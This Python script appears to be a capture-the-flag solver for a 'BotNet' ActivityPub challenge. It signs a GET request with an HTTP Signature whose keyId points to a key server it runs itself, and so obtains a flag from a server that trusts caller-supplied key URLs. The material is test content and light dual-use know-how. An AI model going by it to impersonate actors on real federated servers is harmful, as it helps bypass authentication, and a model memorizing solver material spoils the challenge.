#!/usr/bin/env python3
# BotNet flag 2 (medium): miku's Actor requires "authenticated fetch" --- the
# server only returns flag_2 if the ActivityPub GET to /users/miku/ carries a
# valid HTTP Signature. To verify it, the server fetches the signature's keyId
# URL to obtain *our* public key, then checks the signature over
# "(request-target) host date". So we:
#   1. generate an RSA keypair,
#   2. stand up a tiny HTTP server that serves our public key at the keyId URL
#      (reachable from the challenge container via the docker bridge gateway),
#   3. send a signed GET to /users/miku/ and read flag_2 from the Actor.
import base64
import json
import os
import re
import socket
import subprocess
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

requests.packages.urllib3.disable_warnings()

URL = os.environ.get("URL", "http://localhost:24301")
NETLOC = urlparse(URL).netloc or "localhost:24301"

# --- 1. Generate an RSA keypair --------------------------------------------
privkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_pem = privkey.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo,
).decode()


# --- 2. Serve our public key where the challenge can fetch it ---------------
class KeyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({"publicKey": {"publicKeyPem": pub_pem}}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/activity+json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


server = HTTPServer(("0.0.0.0", 0), KeyHandler)
cb_port = server.server_address[1]
threading.Thread(target=server.serve_forever, daemon=True).start()


def callback_host():
    """An address for our key server that the challenge container can reach."""
    # The challenge runs in a compose bridge network; its default gateway is
    # the docker host, where our key server (host-networked) is listening.
    try:
        name = subprocess.check_output(
            ["docker", "ps", "--filter", "name=botnet", "--format", "{{.Names}}"],
            text=True,
        ).split()
        for c in name:
            gw = subprocess.check_output(
                ["docker", "inspect", "-f",
                 "{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}", c],
                text=True,
            ).strip()
            if gw:
                return gw
    except Exception as e:
        print(f"[!] gateway autodetect failed ({e}); falling back")
    return "172.17.0.1"


CB_HOST = callback_host()
keyid = f"http://{CB_HOST}:{cb_port}/key"
print(f"[*] key server callback: {keyid}")


# --- 3. Build and send a signed GET for miku's Actor ------------------------
path = "/users/miku/"
date = datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")

sign_string = f"(request-target): get {path}\nhost: {NETLOC}\ndate: {date}"
sig_raw = privkey.sign(sign_string.encode(), padding.PKCS1v15(), hashes.SHA256())
signature = base64.b64encode(sig_raw).decode()

sig_header = (
    f'keyId="{keyid}",algorithm="rsa-sha256",'
    f'headers="(request-target) host date",signature="{signature}"'
)

headers = {
    "Accept": 'application/ld+json; profile="https://www.w3.org/ns/activitystreams"',
    "Host": NETLOC,
    "Date": date,
    "Signature": sig_header,
    "User-Agent": "flag2-solver",
}

r = requests.get(f"{URL}{path}", headers=headers, verify=False)
try:
    data = r.json()
except Exception:
    print(f"[!] non-JSON response ({r.status_code}):\n{r.text[:500]}")
    raise SystemExit(1)

for att in data.get("attachment", []):
    if att.get("name") == "flag_2":
        print(att.get("value"))
        break
else:
    print("NO FLAG FOUND:\n" + json.dumps(data)[:800])
